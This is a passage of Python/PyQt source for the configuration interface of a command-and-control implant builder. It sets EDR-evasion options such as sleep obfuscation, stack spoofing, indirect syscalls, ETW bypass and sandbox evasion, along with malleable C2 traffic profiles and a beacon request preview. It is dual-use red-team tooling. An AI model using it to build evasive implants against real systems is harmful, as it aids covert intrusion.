        self._fields["sleep_stack_spoof"] = stack_spoof_w
        stack_spoof_layout.addWidget(stack_spoof_w)
        stack_spoof_layout.addStretch()
        self._stack_spoof_row.setVisible(False)
        obf_form.addRow(self._stack_spoof_row)
        stack_spoof_w.toggled.connect(self._update_conditional_visibility)

        self._num_frames_row = QWidget()
        num_frames_layout = QHBoxLayout(self._num_frames_row)
        num_frames_layout.setContentsMargins(0, 0, 0, 0)
        num_frames_w = _create_schema_widget(_prop_schema("num_spoof_frames"), self._config.get("num_spoof_frames"))
        self._fields["num_spoof_frames"] = num_frames_w
        num_frames_layout.addWidget(QLabel("Num Spoof Frames"))
        num_frames_layout.addWidget(num_frames_w)
        num_frames_layout.addStretch()
        self._num_frames_row.setVisible(False)
        obf_form.addRow(self._num_frames_row)

        layout.addWidget(obf_group)

        # Syscall
        sys_group = QGroupBox("Indirect Syscalls")
        sys_form = QFormLayout(sys_group)

        indirect_sys_w = _create_schema_widget(_prop_schema("use_indirect_syscalls"), self._config.get("use_indirect_syscalls"))
        self._fields["use_indirect_syscalls"] = indirect_sys_w
        indirect_sys_w.toggled.connect(self._update_conditional_visibility)
        sys_form.addRow(indirect_sys_w)

        self._pivot_row = QWidget()
        pivot_layout = QHBoxLayout(self._pivot_row)
        pivot_layout.setContentsMargins(0, 0, 0, 0)
        pivot_w = _create_schema_widget(_prop_schema("indirect_syscall_pivot"), self._config.get("indirect_syscall_pivot"))
        self._fields["indirect_syscall_pivot"] = pivot_w
        pivot_layout.addWidget(QLabel("Pivot API"))
        pivot_layout.addWidget(pivot_w)
        pivot_layout.addStretch()
        self._pivot_row.setVisible(False)
        sys_form.addRow(self._pivot_row)

        lazy_ci_w = _create_schema_widget(_prop_schema("lazy_checkin"), self._config.get("lazy_checkin"))
        self._fields["lazy_checkin"] = lazy_ci_w
        lazy_ci_w.toggled.connect(self._update_conditional_visibility)
        sys_form.addRow(lazy_ci_w)

        self._lazy_checkin_max_row = QWidget()
        lazy_max_layout = QHBoxLayout(self._lazy_checkin_max_row)
        lazy_max_layout.setContentsMargins(0, 0, 0, 0)
        lazy_max_w = _create_schema_widget(_prop_schema("lazy_checkin_max"), self._config.get("lazy_checkin_max"))
        self._fields["lazy_checkin_max"] = lazy_max_w
        lazy_max_layout.addWidget(QLabel("Lazy Check-in Max"))
        lazy_max_layout.addWidget(lazy_max_w)
        lazy_max_layout.addStretch()
        self._lazy_checkin_max_row.setVisible(False)
        sys_form.addRow(self._lazy_checkin_max_row)

        lazy_uh_w = _create_schema_widget(_prop_schema("lazy_unhook"), self._config.get("lazy_unhook"))
        self._fields["lazy_unhook"] = lazy_uh_w
        sys_form.addRow(lazy_uh_w)

        layout.addWidget(sys_group)

        # Options (sub-object)
        opt_group = QGroupBox("Options")
        opt_form = QFormLayout(opt_group)
        opt_schema = _prop_schema("options")
        for opt_name in ("sandbox_evasion", "debug_mode", "bypass_etw", "validate_ssl"):
            sub = opt_schema.get("properties", {}).get(opt_name, {})
            val = self._config.get("options", {}).get(opt_name)
            w = _create_schema_widget(sub, val)
            self._fields[f"options.{opt_name}"] = w
            opt_form.addRow(w)

        layout.addWidget(opt_group)

        layout.addStretch()
        scroll.setWidget(container)
        self._update_conditional_visibility()
        return scroll

    def _update_conditional_visibility(self):
        obf_method = _schema_widget_value(self._fields.get("sleep_obfuscation", QComboBox()))
        stack_spoof = _schema_widget_value(self._fields.get("sleep_stack_spoof", QCheckBox()))
        indirect_sys = _schema_widget_value(self._fields.get("use_indirect_syscalls", QCheckBox()))
        lazy_ci = _schema_widget_value(self._fields.get("lazy_checkin", QCheckBox()))

        self._stack_spoof_row.setVisible(obf_method != "none")
        self._num_frames_row.setVisible(obf_method != "none" and stack_spoof)
        self._pivot_row.setVisible(bool(indirect_sys))
        self._lazy_checkin_max_row.setVisible(bool(lazy_ci))

    # ── Tab 3: Stack Spoof Chain ────────────────────────────────────

    def _build_chain_tab(self) -> QWidget:
        tab = QWidget()
        tab.setObjectName("configTab")
        layout = QVBoxLayout(tab)

        self._chain_stack = _ChainStackWidget()
        self._chain_stack.setItemDelegate(_ChainStackDelegate(self._chain_stack))
        self._chain_stack.chainDropped.connect(self._sync_chain_from_stack)
        self._chain_stack.itemDoubleClicked.connect(self._chain_edit_entry)
        layout.addWidget(self._chain_stack)

        btn_row = QHBoxLayout()
        self._chain_add = QPushButton("Add")
        self._chain_add.clicked.connect(self._chain_add_entry)
        btn_row.addWidget(self._chain_add)

        self._chain_edit = QPushButton("Edit")
        self._chain_edit.clicked.connect(lambda: self._chain_edit_entry())
        btn_row.addWidget(self._chain_edit)

        self._chain_remove = QPushButton("Remove")
        self._chain_remove.clicked.connect(self._chain_remove_entry)
        btn_row.addWidget(self._chain_remove)

        self._chain_up = QPushButton("Up")
        self._chain_up.clicked.connect(self._chain_move_up)
        btn_row.addWidget(self._chain_up)

        self._chain_down = QPushButton("Down")
        self._chain_down.clicked.connect(self._chain_move_down)
        btn_row.addWidget(self._chain_down)

        btn_row.addStretch()
        layout.addLayout(btn_row)

        note = QLabel("Top/bottom entries are locked. Drag or use Up/Down to reorder.")
        note.setObjectName("mutedLabel")
        note.setWordWrap(True)
        layout.addWidget(note)

        return tab

    def _chain_entry_dialog(self, title, module="", function="", offset_text=""):
        dialog = QDialog(self)
        dialog.setWindowTitle(title)
        form = QFormLayout(dialog)

        module_edit = QLineEdit(module)
        module_edit.setPlaceholderText("ntdll.dll")
        form.addRow("Module DLL:", module_edit)

        func_edit = QLineEdit(function)
        func_edit.setPlaceholderText("RtlUserThreadStart")
        form.addRow("Function:", func_edit)

        offset_edit = QLineEdit(offset_text)
        offset_edit.setPlaceholderText("0 (auto-scan)")
        offset_edit.setToolTip(
            "Decimal or hex (e.g. 0x1000). 0 = auto-scan at build time."
        )
        form.addRow("Offset:", offset_edit)

        note = QLabel("Auto-populated at build if left empty.")
        note.setObjectName("mutedLabel")
        note.setWordWrap(True)
        form.addRow(note)

        buttons = QDialogButtonBox(
            QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel
        )
        buttons.accepted.connect(dialog.accept)
        buttons.rejected.connect(dialog.reject)
        form.addRow(buttons)

        if not dialog.exec():
            return None
        return (
            module_edit.text().strip(),
            func_edit.text().strip(),
            offset_edit.text().strip(),
        )

    def _chain_add_entry(self):
        result = self._chain_entry_dialog("Add Chain Entry")
        if result is None:
            return
        module, function, offset_text = result
        if not module or not function:
            return

        if "stack_spoof_chain" not in self._config:
            self._config["stack_spoof_chain"] = []
        entry = {"module": module, "function": function}
        if offset_text:
            try:
                offset = int(offset_text, 0)
            except ValueError:
                return
            if offset:
                entry["offset"] = offset
        self._config["stack_spoof_chain"].append(entry)
        self._refresh_chain_stack()

    def _chain_edit_entry(self, item=None):
        if item is not None:
            list_row = self._chain_stack.row(item)
        else:
            list_row = self._chain_stack.currentRow()
        chain = self._config.get("stack_spoof_chain", [])
        ci = list_row - 1
        if not (0 <= ci < len(chain)):
            return

        entry = chain[ci]
        offset = entry.get("offset", 0)
        offset_text = hex(offset) if offset else ""
        result = self._chain_entry_dialog(
            "Edit Chain Entry",
            entry.get("module", ""),
            entry.get("function", ""),
            offset_text,
        )
        if result is None:
            return

        module, function, offset_text = result
        if not module or not function:
            return

        entry["module"] = module
        entry["function"] = function
        if offset_text:
            try:
                offset = int(offset_text, 0)
            except ValueError:
                return
            if offset:
                entry["offset"] = offset
            else:
                entry.pop("offset", None)
        else:
            entry.pop("offset", None)
        self._refresh_chain_stack()

    def _chain_remove_entry(self):
        list_row = self._chain_stack.currentRow()
        chain = self._config.get("stack_spoof_chain", [])
        ci = list_row - 1
        if 0 <= ci < len(chain):
            del chain[ci]
            self._refresh_chain_stack()

    def _chain_move_up(self):
        list_row = self._chain_stack.currentRow()
        chain = self._config.get("stack_spoof_chain", [])
        ci = list_row - 1
        if ci > 0 and ci < len(chain):
            chain[ci - 1], chain[ci] = chain[ci], chain[ci - 1]
            self._refresh_chain_stack()
            self._chain_stack.setCurrentRow(list_row - 1)

    def _chain_move_down(self):
        list_row = self._chain_stack.currentRow()
        chain = self._config.get("stack_spoof_chain", [])
        ci = list_row - 1
        if 0 <= ci < len(chain) - 1:
            chain[ci], chain[ci + 1] = chain[ci + 1], chain[ci]
            self._refresh_chain_stack()
            self._chain_stack.setCurrentRow(list_row + 1)

    def _sync_chain_from_stack(self):
        chain = []
        for row in range(1, self._chain_stack.count() - 1):
            item = self._chain_stack.item(row)
            data = item.data(Qt.ItemDataRole.UserRole) if item else None
            if isinstance(data, dict) and data.get("type") == "user":
                entry = {
                    "module": data.get("module", ""),
                    "function": data.get("function", ""),
                }
                offset = data.get("offset", 0)
                if offset:
                    entry["offset"] = offset
                chain.append(entry)
        self._config["stack_spoof_chain"] = chain
        self._refresh_chain_stack()

    def _refresh_chain_stack(self):
        self._chain_stack.clear()

        top_item = QListWidgetItem()
        top_item.setData(Qt.ItemDataRole.UserRole, {"type": "anchor_top"})
        top_item.setFlags(Qt.ItemFlag.ItemIsEnabled)
        self._chain_stack.addItem(top_item)

        for entry in self._config.get("stack_spoof_chain", []):
            data = {
                "type": "user",
                "module": entry.get("module", ""),
                "function": entry.get("function", ""),
                "offset": entry.get("offset", 0),
            }
            user_item = QListWidgetItem()
            user_item.setData(Qt.ItemDataRole.UserRole, data)
            user_item.setFlags(
                Qt.ItemFlag.ItemIsEnabled
                | Qt.ItemFlag.ItemIsSelectable
                | Qt.ItemFlag.ItemIsDragEnabled
            )
            self._chain_stack.addItem(user_item)

        bottom_item = QListWidgetItem()
        bottom_item.setData(Qt.ItemDataRole.UserRole, {"type": "anchor_bottom"})
        bottom_item.setFlags(Qt.ItemFlag.ItemIsEnabled)
        self._chain_stack.addItem(bottom_item)

    # ── Tab 4: Malleable C2 ─────────────────────────────────────────

    _DIRECTION_KEYS = [
        ("Poll", "poll_malleable_config", False),
        ("Submit", "submit_malleable_config", False),
        ("Poll Response", "poll_response_malleable_config", True),
        ("Submit Response", "submit_response_malleable_config", True),
    ]

    def _build_malleable_tab(self) -> QWidget:
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setFrameShape(QScrollArea.Shape.NoFrame)

        container = QWidget()
        container.setObjectName("configTab")
        layout = QVBoxLayout(container)

        # Channel selector for per-channel malleable config
        sel_row = QHBoxLayout()
        sel_row.addWidget(QLabel("Channel:"))
        self._malleable_channel = QComboBox()
        self._malleable_channel.currentIndexChanged.connect(self._on_malleable_selection_changed)
        sel_row.addWidget(self._malleable_channel)

        sel_row.addWidget(QLabel("Direction:"))
        self._malleable_direction = QComboBox()
        for label, _, _ in self._DIRECTION_KEYS:
            self._malleable_direction.addItem(label)
        self._malleable_direction.currentIndexChanged.connect(self._on_malleable_selection_changed)
        sel_row.addWidget(self._malleable_direction)

        sel_row.addStretch()
        layout.addLayout(sel_row)

        # Mode indicator
        self._mal_mode_label = QLabel("")
        self._mal_mode_label.setObjectName("mutedLabel")
        layout.addWidget(self._mal_mode_label)

        # Wrapper
        wrap_group = QGroupBox("Wrapper (prefix/suffix)")
        wrap_form = QFormLayout(wrap_group)

        self._wrap_prefix = QLineEdit()
        self._wrap_prefix.setPlaceholderText("REQ_${RAND_B64:4}_")
        self._wrap_prefix.setMaxLength(65535)
        wrap_form.addRow("Prefix", self._wrap_prefix)

        self._wrap_suffix = QLineEdit()
        self._wrap_suffix.setPlaceholderText("_${JUNK:8}")
        self._wrap_suffix.setMaxLength(65535)
        wrap_form.addRow("Suffix", self._wrap_suffix)

        layout.addWidget(wrap_group)

        # HTTP Headers (request direction)
        self._headers_group = QGroupBox("Custom HTTP Headers")
        hdr_layout = QVBoxLayout(self._headers_group)

        self._headers_table = QTableWidget(0, 2)
        self._headers_table.setHorizontalHeaderLabels(["Name", "Value"])
        self._headers_table.horizontalHeader().setStretchLastSection(True)
        hdr_layout.addWidget(self._headers_table)

        hdr_btn_row = QHBoxLayout()
        self._hdr_add = QPushButton("Add Header")
        self._hdr_add.clicked.connect(self._header_add)
        hdr_btn_row.addWidget(self._hdr_add)

        self._hdr_remove = QPushButton("Remove")
        self._hdr_remove.clicked.connect(self._header_remove)
        hdr_btn_row.addWidget(self._hdr_remove)

        hdr_btn_row.addStretch()
        hdr_layout.addLayout(hdr_btn_row)
        layout.addWidget(self._headers_group)

        # Response-specific fields (visible only for response directions)
        self._resp_fields_group = QGroupBox("Response Config")
        resp_fields_layout = QFormLayout(self._resp_fields_group)

        self._resp_status_code = QSpinBox()
        self._resp_status_code.setRange(100, 599)
        self._resp_status_code.setValue(200)
        resp_fields_layout.addRow("Status Code", self._resp_status_code)

        self._resp_body_template = QLineEdit()
        self._resp_body_template.setPlaceholderText("{{PAYLOAD}}")
        resp_fields_layout.addRow("Body Template", self._resp_body_template)

        self._resp_headers_table = QTableWidget(0, 2)
        self._resp_headers_table.setHorizontalHeaderLabels(["Name", "Value"])
        self._resp_headers_table.horizontalHeader().setStretchLastSection(True)
        self._resp_headers_table.setMaximumHeight(120)
        resp_fields_layout.addRow("Response Headers", self._resp_headers_table)

        rhdr_btns = QHBoxLayout()
        self._resp_hdr_add = QPushButton("Add")
        self._resp_hdr_add.clicked.connect(self._resp_header_add)
        rhdr_btns.addWidget(self._resp_hdr_add)
        self._resp_hdr_remove = QPushButton("Remove")
        self._resp_hdr_remove.clicked.connect(self._resp_header_remove)
        rhdr_btns.addWidget(self._resp_hdr_remove)
        rhdr_btns.addStretch()
        resp_fields_layout.addRow(rhdr_btns)

        self._resp_fields_group.setVisible(False)
        layout.addWidget(self._resp_fields_group)

        # Payload Location
        pl_group = QGroupBox("Payload Location")
        pl_form = QFormLayout(pl_group)

        self._pl_type = QComboBox()
        self._pl_type.addItems(["query_param", "path"])
        pl_form.addRow("Type", self._pl_type)

        self._pl_param = QLineEdit()
        self._pl_param.setPlaceholderText("q")
        pl_form.addRow("Query Param Name", self._pl_param)

        self._pl_path_prefix = QLineEdit()
        self._pl_path_prefix.setPlaceholderText("/api/")
        pl_form.addRow("Path Prefix", self._pl_path_prefix)

        self._pl_path_suffix = QLineEdit()
        self._pl_path_suffix.setPlaceholderText(".png")
        pl_form.addRow("Path Suffix", self._pl_path_suffix)

        self._pl_body_ct = QComboBox()
        self._pl_body_ct.addItems(["text/plain", "application/octet-stream"])
        pl_form.addRow("Body Content-Type", self._pl_body_ct)

        self._pl_cookie = QLineEdit()
        self._pl_cookie.setPlaceholderText("cookie name")
        pl_form.addRow("Cookie Name", self._pl_cookie)

        layout.addWidget(pl_group)
        layout.addStretch()
        scroll.setWidget(container)

        # Initial population
        self._populate_malleable_channels()
        return scroll

    def _populate_malleable_channels(self):
        """Populate the channel dropdown for malleable config editing."""
        self._malleable_channel.blockSignals(True)
        self._malleable_channel.clear()
        channels = self._config.get("c2_channels", [])
        for i, ch in enumerate(channels):
            ch_type = ch.get("type", "HTTP")
            host = ch.get("host", "")
            port = ch.get("port", 0)
            label = f"{i+1}. {ch_type}  {host}:{port}"
            self._malleable_channel.addItem(label, ("channel", i))
        self._malleable_channel.addItem("Global (fallback)", ("global", None))
        self._malleable_channel.blockSignals(False)

    def _get_malleable_target(self) -> tuple[dict, str, str, bool]:
        """
        Get the specific malleable config block for the selected channel+direction.
        Returns (block_dict, target_desc, block_key, is_response).
        """
        dir_idx = self._malleable_direction.currentIndex()
        if dir_idx < 0 or dir_idx >= len(self._DIRECTION_KEYS):
            dir_idx = 0
        dir_label, block_key, is_response = self._DIRECTION_KEYS[dir_idx]

        data = self._malleable_channel.currentData()
        if not data or data[0] == "global":
            parent = self._config
            desc = "global"
        else:
            _, idx = data
            channels = self._config.setdefault("c2_channels", [])
            if idx >= len(channels):
                parent = self._config
                desc = "global"
            else:
                parent = channels[idx]
                desc = f"channel:{idx}"

        if block_key not in parent:
            parent[block_key] = {}
        return parent[block_key], f"{desc}/{dir_label}", block_key, is_response

    def _on_malleable_selection_changed(self):
        """Refresh all malleable tab fields when channel or direction changes."""
        self._refresh_malleable_fields()

    def _refresh_malleable_fields(self):
        """Refresh all malleable tab fields from the currently selected target."""
        mc, target, block_key, is_response = self._get_malleable_target()

        # Mode label
        self._mal_mode_label.setText(target)

        # Show/hide response fields
        self._resp_fields_group.setVisible(is_response)

        # Update payload location type choices
        prev_type = self._pl_type.currentText()
        self._pl_type.blockSignals(True)
        self._pl_type.clear()
        if "poll" in block_key and not is_response:
            self._pl_type.addItems(["query_param", "path"])
        else:
            self._pl_type.addItems(["body", "query_param", "path"])
        self._pl_type.setCurrentText(prev_type if prev_type in [self._pl_type.itemText(i) for i in range(self._pl_type.count())] else self._pl_type.itemText(0))
        self._pl_type.blockSignals(False)

        wrapper = mc.get("wrapper", {})
        self._wrap_prefix.setText(wrapper.get("prefix", ""))
        self._wrap_suffix.setText(wrapper.get("suffix", ""))
        self._refresh_headers_table()

        pl = mc.get("payload_location", {})
        pl_type = pl.get("type", self._pl_type.itemText(0))
        if pl_type in [self._pl_type.itemText(i) for i in range(self._pl_type.count())]:
            self._pl_type.setCurrentText(pl_type)
        self._pl_param.setText(pl.get("param_name", ""))
        self._pl_path_prefix.setText(pl.get("path_prefix", ""))
        self._pl_path_suffix.setText(pl.get("path_suffix", ""))
        self._pl_body_ct.setCurrentText(pl.get("body_content_type", "text/plain"))
        self._pl_cookie.setText(pl.get("cookie_name", ""))

        # Response fields
        if is_response:
            self._resp_status_code.setValue(mc.get("status_code", 200))
            self._resp_body_template.setText(mc.get("body_template", ""))
            self._refresh_resp_headers_table()

    def _header_add(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Add HTTP Header")
        form = QFormLayout(dialog)

        name_edit = QLineEdit()
        name_edit.setPlaceholderText("X-My-Header")
        form.addRow("Name:", name_edit)

        value_edit = QLineEdit()
        value_edit.setPlaceholderText("some-value")
        form.addRow("Value:", value_edit)

        buttons = QDialogButtonBox(
            QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel
        )
        buttons.accepted.connect(dialog.accept)
        buttons.rejected.connect(dialog.reject)
        form.addRow(buttons)

        if not dialog.exec():
            return

        name = name_edit.text().strip()
        value = value_edit.text().strip()
        if not name:
            return

        mc, _, _, _ = self._get_malleable_target()
        headers = mc.setdefault("http_headers", [])
        headers.append({"name": name, "value": value})
        self._refresh_headers_table()

    def _header_remove(self):
        row = self._headers_table.currentRow()
        mc, _, _, _ = self._get_malleable_target()
        headers = mc.get("http_headers", [])
        if 0 <= row < len(headers):
            del headers[row]
            self._refresh_headers_table()

    def _refresh_headers_table(self):
        mc, _, _, _ = self._get_malleable_target()
        headers = mc.get("http_headers", [])
        self._headers_table.setRowCount(len(headers))
        for i, h in enumerate(headers):
            self._headers_table.setItem(i, 0, QTableWidgetItem(h.get("name", "")))
            self._headers_table.setItem(i, 1, QTableWidgetItem(h.get("value", "")))

    def _resp_header_add(self):
        row = self._resp_headers_table.rowCount()
        self._resp_headers_table.insertRow(row)
        self._resp_headers_table.setItem(row, 0, QTableWidgetItem(""))
        self._resp_headers_table.setItem(row, 1, QTableWidgetItem(""))

    def _resp_header_remove(self):
        row = self._resp_headers_table.currentRow()
        if row >= 0:
            self._resp_headers_table.removeRow(row)

    def _refresh_resp_headers_table(self):
        mc, _, _, _ = self._get_malleable_target()
        hdrs = mc.get("headers", {})
        self._resp_headers_table.setRowCount(len(hdrs))
        for i, (k, v) in enumerate(hdrs.items()):
            self._resp_headers_table.setItem(i, 0, QTableWidgetItem(k))
            self._resp_headers_table.setItem(i, 1, QTableWidgetItem(v))

    # ── Tab 5: Work Hours & Spawn-to ────────────────────────────────

    def _build_workhours_tab(self) -> QWidget:
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setFrameShape(QScrollArea.Shape.NoFrame)

        container = QWidget()
        container.setObjectName("configTab")
        layout = QVBoxLayout(container)

        # Work hours (generated from schema)
        wh_group = QGroupBox("Work Hours (UTC)")
        wh_form = QFormLayout(wh_group)
        wh_schema = _prop_schema("work_hours").get("properties", {})
        wh_cfg = self._config.get("work_hours", {})
        for wh_name in ("enabled", "start_hour", "start_minute", "end_hour", "end_minute", "insomnia"):
            sub = wh_schema.get(wh_name, {})
            val = wh_cfg.get(wh_name)
            w = _create_schema_widget(sub, val)
            self._fields[f"work_hours.{wh_name}"] = w
            if sub.get("type") == "boolean":
                wh_form.addRow(w)
            else:
                wh_form.addRow(sub.get("description", wh_name), w)

        layout.addWidget(wh_group)

        # Spawn-to (generated from schema)
        st_group = QGroupBox("Spawn-to Process")
        st_form = QFormLayout(st_group)
        st_schema = _prop_schema("spawnto").get("properties", {})
        st_cfg = self._config.get("spawnto", {})
        for st_name in ("x64", "x86"):
            sub = st_schema.get(st_name, {})
            val = st_cfg.get(st_name)
            w = _create_schema_widget(sub, val)
            self._fields[f"spawnto.{st_name}"] = w
            st_form.addRow(sub.get("description", st_name), w)

        layout.addWidget(st_group)
        layout.addStretch()
        scroll.setWidget(container)
        return scroll

    # ── Tab: Post-Build ───────────────────────────────────────────────

    def _build_postbuild_tab(self) -> QWidget:
        tab = QWidget()
        tab.setObjectName("configTab")
        layout = QVBoxLayout(tab)

        # Post-Build Append (unencrypted, IOC markers)
        post_group = QGroupBox("Post-Build Append - Unencrypted IOC markers")
        post_form = QFormLayout(post_group)

        self._post_append_list = QListWidget()
        self._post_append_list.setMaximumHeight(120)
        post_form.addRow("Strings:", self._post_append_list)

        post_btn_row = QHBoxLayout()
        self._post_add = QPushButton("Add")
        self._post_add.clicked.connect(self._post_append_add)
        post_btn_row.addWidget(self._post_add)

        self._post_remove = QPushButton("Remove")
        self._post_remove.clicked.connect(self._post_append_remove)
        post_btn_row.addWidget(self._post_remove)

        post_btn_row.addStretch()
        post_form.addRow(post_btn_row)

        post_info = QLabel("Appended unencrypted — visible in strings output.")
        post_info.setWordWrap(True)
        post_info.setStyleSheet("color: #888; font-size: 10px;")
        post_form.addRow(post_info)

        layout.addWidget(post_group)

        # In-Memory Append (encrypted in config blob, decrypted at runtime)
        inmem_group = QGroupBox("In-Memory Append - Encrypted config strings")
        inmem_form = QFormLayout(inmem_group)

        self._inmem_append_list = QListWidget()
        self._inmem_append_list.setMaximumHeight(120)
        inmem_form.addRow("Strings:", self._inmem_append_list)

        inmem_btn_row = QHBoxLayout()
        self._inmem_add = QPushButton("Add")
        self._inmem_add.clicked.connect(self._inmem_append_add)
        inmem_btn_row.addWidget(self._inmem_add)

        self._inmem_remove = QPushButton("Remove")
        self._inmem_remove.clicked.connect(self._inmem_append_remove)
        inmem_btn_row.addWidget(self._inmem_remove)

        inmem_btn_row.addStretch()
        inmem_form.addRow(inmem_btn_row)

        inmem_info = QLabel("Encrypted in config — not visible in strings output.")
        inmem_info.setWordWrap(True)
        inmem_info.setStyleSheet("color: #888; font-size: 10px;")
        inmem_form.addRow(inmem_info)

        layout.addWidget(inmem_group)

        layout.addStretch()
        return tab

    def _post_append_add(self):
        text, ok = QInputDialog.getText(self, "Add Post-Build String", "String:")
        if ok and text:
            self._post_append_list.addItem(text)
            self._sync_post_append_list()

    def _post_append_remove(self):
        row = self._post_append_list.currentRow()
        if row >= 0:
            self._post_append_list.takeItem(row)
            self._sync_post_append_list()

    def _inmem_append_add(self):
        text, ok = QInputDialog.getText(self, "Add In-Memory String", "String:")
        if ok and text:
            self._inmem_append_list.addItem(text)
            self._sync_inmem_append_list()

    def _inmem_append_remove(self):
        row = self._inmem_append_list.currentRow()
        if row >= 0:
            self._inmem_append_list.takeItem(row)
            self._sync_inmem_append_list()

    def _sync_post_append_list(self):
        self._config["post_build"] = {"append": [self._post_append_list.item(i).text() for i in range(self._post_append_list.count())]}

    def _sync_inmem_append_list(self):
        self._config["in_memory_append"] = {"append": [self._inmem_append_list.item(i).text() for i in range(self._inmem_append_list.count())]}

    # ── Tab: Request Preview ─────────────────────────────────────────────

    def _build_preview_tab(self) -> QWidget:
        tab = QWidget()
        tab.setObjectName("configTab")
        layout = QVBoxLayout(tab)

        # Controls
        ctrl_row = QHBoxLayout()
        self._preview_refresh = QPushButton("Refresh Preview")
        self._preview_refresh.clicked.connect(self._refresh_preview)
        ctrl_row.addWidget(self._preview_refresh)

        # Channel selector (handles multiple C2 channels)
        self._preview_channel = QComboBox()
        self._preview_channel.currentIndexChanged.connect(self._refresh_preview)
        ctrl_row.addWidget(QLabel("Channel:"))
        ctrl_row.addWidget(self._preview_channel)

        self._preview_profile = QComboBox()
        self._preview_profile.addItems(["Poll (GET)", "Submit (POST)", "Task Result", "File Upload"])
        self._preview_profile.currentTextChanged.connect(self._refresh_preview)
        ctrl_row.addWidget(QLabel("Profile:"))
        ctrl_row.addWidget(self._preview_profile)
        ctrl_row.addStretch()
        layout.addLayout(ctrl_row)

        # Mal Mode indicator (read-only label showing effective mode)
        self._preview_mode_label = QLabel("Mode: -")
        self._preview_mode_label.setStyleSheet("color: #9cdcfe; font-family: Consolas; font-size: 9pt;")
        ctrl_row.addWidget(self._preview_mode_label)

        # Request display
        self._preview_text = QTextEdit()
        self._preview_text.setReadOnly(True)
        self._preview_text.setFont(QFont("Consolas", 9))
        self._preview_text.setStyleSheet("background-color: #1a1a1a; color: #e0e0e0; border: 1px solid #333;")
        layout.addWidget(self._preview_text)

        # Initial render (populate channel dropdown first)
        self._populate_preview_channels()
        self._refresh_preview()
        return tab

    def _populate_preview_channels(self):
        """Populate the channel dropdown with all configured C2 channels."""
        self._preview_channel.blockSignals(True)
        self._preview_channel.clear()
        channels = self._config.get("c2_channels", [])
        for i, ch in enumerate(channels):
            ch_type = ch.get("type", "HTTP")
            host = ch.get("host", "")
            port = ch.get("port", 0)
            label = f"{i+1}. {ch_type}  {host}:{port}"
            self._preview_channel.addItem(label, i)
        self._preview_channel.blockSignals(False)

    def _get_effective_malleable(self, channel: dict, direction: str) -> tuple[dict, str]:
        """
        Determine the effective malleable config for a channel+direction.
        direction: "poll", "submit", "poll_response", "submit_response"
        Returns (malleable_config_dict, mode_string).
        """
        c = self._config
        ch_type = channel.get("type", "HTTP")

        if ch_type in ("TCP", "PIPE"):
            return {}, "NONE (TCP/PIPE)"

        block_key = f"{direction}_malleable_config"
        ch_block = channel.get(block_key)
        if ch_block:
            return ch_block, f"PER-CHANNEL ({direction})"
        global_block = c.get(block_key)
        if global_block:
            return global_block, f"GLOBAL ({direction})"
        return {}, "NONE"

    def _refresh_preview(self):
        """Generate and display a preview HTTP request based on current config."""
        import random
        import base64
        import time

        c = self._config
        channels = c.get("c2_channels", [{}])

        ch_idx = self._preview_channel.currentData()
        if ch_idx is None or ch_idx >= len(channels):
            ch_idx = 0
        ch = channels[ch_idx]

        profile = self._preview_profile.currentText()

        # Determine direction from profile (GET → poll, POST → submit)
        is_poll = "(GET)" in profile
        direction = "poll" if is_poll else "submit"

        mc, mode_str = self._get_effective_malleable(ch, direction)
        self._preview_mode_label.setText(f"Mode: {mode_str}")

        wrapper = mc.get("wrapper", {})

        beacon_id = "a1b2c3d4"
        session_id = random.randint(1, 0xFFFFFFFF)
        timestamp = int(time.time())
        rand_b64_4 = base64.b64encode(random.randbytes(3)).decode()[:4]
        rand_b64_8 = base64.b64encode(random.randbytes(6)).decode()[:8]
        junk_8 = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=8))

        macros = {
            "${BEACON_ID}": beacon_id,
            "${SESSION_ID}": f"{session_id:08x}",
            "${TIMESTAMP}": str(timestamp),
            "${RAND_B64:4}": rand_b64_4,
            "${RAND_B64:8}": rand_b64_8,
            "${JUNK:8}": junk_8,
            "${JUNK:16}": junk_8 + junk_8,
        }

        def expand(text: str) -> str:
            for k, v in macros.items():
                text = text.replace(k, v)
            return text

        method = "GET" if is_poll else "POST"
        host = ch.get("host", "127.0.0.1")
        port = ch.get("port", 6767)
        path = ch.get(f"{direction}_path", "/api/poll")
        ua = ch.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

        prefix = expand(wrapper.get("prefix", ""))
        suffix = expand(wrapper.get("suffix", ""))

        pl = mc.get("payload_location", {})
        pl_type = pl.get("type", "query_param" if is_poll else "body")
        pl_param = pl.get("param_name", "q")
        pl_path_prefix = pl.get("path_prefix", "")
        pl_path_suffix = pl.get("path_suffix", "")
        pl_body_ct = pl.get("body_content_type", "text/plain")

        sample_payload = base64.b64encode(b"\x00" * 64).decode()
        req_path = expand(pl_path_prefix + path + pl_path_suffix)

        headers = {
            "User-Agent": expand(ua),
            "Host": f"{host}:{port}",
        }

        # Custom headers (macro-expanded like the beacon does)
        for hdr in mc.get("http_headers", []):
            headers[expand(hdr.get("name", ""))] = expand(hdr.get("value", ""))

        # Build request
        if pl_type == "query_param":
            sep = "&" if "?" in req_path else "?"
            req_path += f"{sep}{pl_param}={sample_payload}"
            body = ""
            ct = ""
        elif pl_type == "path":
            # Payload in path suffix already handled
            body = ""
            ct = ""
        else:  # body
            body = prefix + sample_payload + suffix
            ct = pl_body_ct

        # HTTP request lines
        lines = []
        lines.append(f"{method} {req_path} HTTP/1.1")
        for k, v in headers.items():
            lines.append(f"{k}: {v}")
        if ct:
            lines.append(f"Content-Type: {ct}")
        if body:
            lines.append(f"Content-Length: {len(body)}")
        lines.append("")
        if body:
            lines.append(body)

        request_text = "\r\n".join(lines)

        # Display with color hints (using HTML)
        html = f"""
        <pre style="font-family: Consolas, monospace; font-size: 10pt; color: #e0e0e0;">
        <span style="color: #4ec9b0;">{method} {req_path} HTTP/1.1</span>
        """
        for k, v in headers.items():
            html += f'\n<span style="color: #9cdcfe;">{k}</span>: <span style="color: #ce9178;">{v}</span>'
        if ct:
            html += f'\n<span style="color: #9cdcfe;">Content-Type</span>: <span style="color: #ce9178;">{ct}</span>'
        if body:
